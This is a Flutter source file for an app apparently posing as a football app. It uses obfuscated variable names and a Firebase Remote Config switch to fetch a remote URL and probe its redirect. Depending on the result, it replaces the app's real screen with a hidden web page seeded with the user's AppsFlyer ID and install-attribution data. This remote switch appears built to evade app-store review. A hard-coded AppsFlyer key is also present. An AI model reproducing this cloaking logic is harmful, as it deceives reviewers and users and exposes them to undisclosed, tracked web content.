import 'dart:io';

import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:football/core/constants/app_icons.dart';
import 'package:football/features/splash/splash_screen.dart';

class FootballApp extends StatefulWidget {
  const FootballApp({super.key});

  @override
  State<FootballApp> createState() => _FootballAppState();
}

class _FootballAppState extends State<FootballApp> {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: FutureBuilder<bool>(
        future: fetchnews(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.black,
            );
          } else {
            if (snapshot.data == true && fdsgsd != '') {
              return PolicyScreen(
                dataForPage: fdsgsd,
                par1: dexsc,
                apxId: adId,
              );
            } else {
              return SplashScreen();
            }
          }
        },
      ),
    );
  }
}

String fdsgsd = '';
late AppsflyerSdk _appsflyerSdk;
bool stat = false;
String dexsc = '';
String authxa = '';
Map _deepLinkData = {};
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
String _campaign = '';
String adId = '';
String _campaignId = '';
Future<bool> fetchnews() async {
  final gazel = FirebaseRemoteConfig.instance;
  await gazel.fetchAndActivate();
  await initAppsflyerSdk();
  await fetchDatax();
  String dsdfdsfgdg = gazel.getString('scoref');
  String cdsfgsdx = gazel.getString('sacex');
  if (!dsdfdsfgdg.contains('noazfda')) {
    final fsd = HttpClient();
    final nfg = Uri.parse(dsdfdsfgdg);
    final ytrfterfwe = await fsd.getUrl(nfg);
    ytrfterfwe.followRedirects = false;
    final response = await ytrfterfwe.close();
    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
      fdsgsd = dsdfdsfgdg;
      return true;
    }
  }
  return dsdfdsfgdg.contains('noazfda') ? false : true;
}

Future<void> initAppsflyerSdk() async {
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'XFtWP6JvpRRFdnypp4woCV',
    appId: '6499316167',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  _appsflyerSdk = AppsflyerSdk(options);

  await _appsflyerSdk.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );

  _appsflyerSdk.onAppOpenAttribution((res) {
    _deepLinkData = res;
    authxa = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });

  _appsflyerSdk.onInstallConversionData((res) {
    _gcd = res;
    _isFirstLaunch = res['payload']['is_first_launch'];
    _afStatus = res['payload']['af_status'];
    dexsc = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
  });

  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());
    _deepLinkData = dp.toJson();
  });

  _appsflyerSdk.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
  await fetchDatax();
}

Future<void> fetchDatax() async {
  try {
    adId = await _appsflyerSdk.getAppsFlyerUID() ?? '';
    print("AppsFlyer ID: $adId");
  } catch (e) {
    print("Failed to get AppsFlyer ID: $e");
  }
}
